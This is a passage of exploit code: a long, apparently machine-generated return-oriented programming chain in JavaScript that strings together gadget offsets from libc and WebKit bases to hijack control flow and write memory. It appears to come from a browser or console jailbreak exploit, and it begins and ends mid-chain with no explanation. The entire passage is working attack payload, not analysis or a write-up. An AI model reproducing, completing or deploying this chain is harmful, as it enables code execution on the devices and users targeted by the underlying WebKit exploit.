libc_base+362222, //pop rsi
ropchain+191040, //L3152-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3151:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3152:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3153:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3154:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+191176, //L3155-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+191208, //L3157-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+191192, //L3156-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3155:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3156:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+191296, //L3158-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3158:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+191352, //L3161-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3161:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+191488, //L3163-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+191504, //L3164-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+191472, //L3162-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3162:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3163:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3164:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223872, //mov al, [rdi]
libc_base+362222, //pop rsi
ropchain+191664, //L3168-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+191616, //L3165-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+191648, //L3167-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3165:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3166:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L3167:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+191720, //L3170-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L3170:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+191824, //L3171-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+191856, //L3173-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+191840, //L3172-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3171:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3172:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3173:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+192016, //L3177-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+191968, //L3174-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+192000, //L3176-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3174:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3175:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L3176:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3177:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+192072, //L3179-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L3179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+192176, //L3180-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+192208, //L3182-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+192192, //L3181-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3180:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3181:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3182:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+192368, //L3186-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+192320, //L3183-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+192352, //L3185-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3183:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3184:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L3185:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3186:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+192424, //L3188-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L3188:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+192528, //L3189-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+192560, //L3191-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+192544, //L3190-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3189:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3190:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3191:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+192632, //L3192-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+192648, //L3193-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3192:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3193:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+192808, //L3197-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+192760, //L3194-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+192792, //L3196-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3194:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3195:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L3196:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3197:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+192864, //L3199-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L3199:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+192968, //L3200-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+193000, //L3202-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+192984, //L3201-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3200:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3201:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3202:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+193096, //L3204-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+193080, //L3203-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3203:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3204:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+193192, //L3207-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3205:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L3207:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+193296, //L3210-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+193280, //L3209-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3209:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+193440, //L3213-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+193408, //L3211-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+193424, //L3212-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3211:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3212:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3213:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+193512, //L3214-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3214:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+193568, //L3217-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3217:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+193664, //L3220-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3218:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+757614,); //pop rcx
//L3220:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+193768, //L3223-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+193752, //L3222-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3222:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3223:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+193936, //L3226-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+193952, //L3227-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+193904, //L3224-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+193920, //L3225-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3224:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3225:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3226:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+194056, //L3228-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+194088, //L3230-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+194072, //L3229-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3228:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3229:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3230:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+194176, //L3231-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3231:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+194232, //L3234-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3234:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+194304, //L3235-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3235:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+194360, //L3238-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3238:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
//L3239:
libc_base+362222, //pop rsi
ropchain+194464, //L3242-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3240:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+757614,); //pop rcx
//L3242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+194568, //L3245-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+194552, //L3244-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3244:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+194736, //L3248-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+194752, //L3249-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+194704, //L3246-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+194720, //L3247-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3246:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3247:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3248:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3249:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+194848, //L3251-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+194832, //L3250-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3250:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3251:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+194936, //L3253-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3252:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3253:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+195008, //L3256-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3254:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+757614,); //pop rcx
//L3256:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+195072, //L3257-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3257:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+766440, //pop rsp
ropchain+189000, //L3098
//L3131:
libc_base+766440, //pop rsp
ropchain+205336, //L3259
//L3086:
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+195200, //L3261-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L3260:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3261:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3262:
db([1, 0]); // 0x1
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3263:
db([2, 0]); // 0x2
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3265:
ropchain+195416, //L3264
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+209368, //L3266
//L3264:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+195488, //L3269-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3267:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L3269:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L3271:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+195592, //L3273-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3272:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3273:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L3275:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+195688, //L3277-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3276:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+195760, //L3279-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3278:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3279:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+195832, //L3281-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3280:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3281:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+195904, //L3283-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3282:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3283:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+195976, //L3285-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3284:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+196048, //L3287-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3286:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3287:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+196120, //L3289-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3288:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3289:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+196192, //L3291-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3290:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3292:
db([4294967257, 4294967295]); // -0x27
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+196288, //L3295-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3294:
db([2, 0]); // 0x2
set_gadget(libc_base+467092,); //pop rax
//L3295:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3296:
db([4294967258, 4294967295]); // -0x26
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+196392, //L3300-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L3299:
db([15395, 0]); // 0x3c23
set_gadget(libc_base+155394,); //pop rdi
//L3300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+5166499, //mov [rdi], cx
libc_base+362222, //pop rsi
ropchain+196464, //L3303-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3301:
db([4294967260, 4294967295]); // -0x24
set_gadget(libc_base+155394,); //pop rdi
//L3303:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+196528, //L3305-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3304:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3305:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+196592, //L3307-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L3306:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L3307:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+196688, //L3309-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3308:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+467092,); //pop rax
//L3309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+196792, //L3312-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3310:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L3312:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+196896, //L3315-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+196880, //L3314-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3314:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3315:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
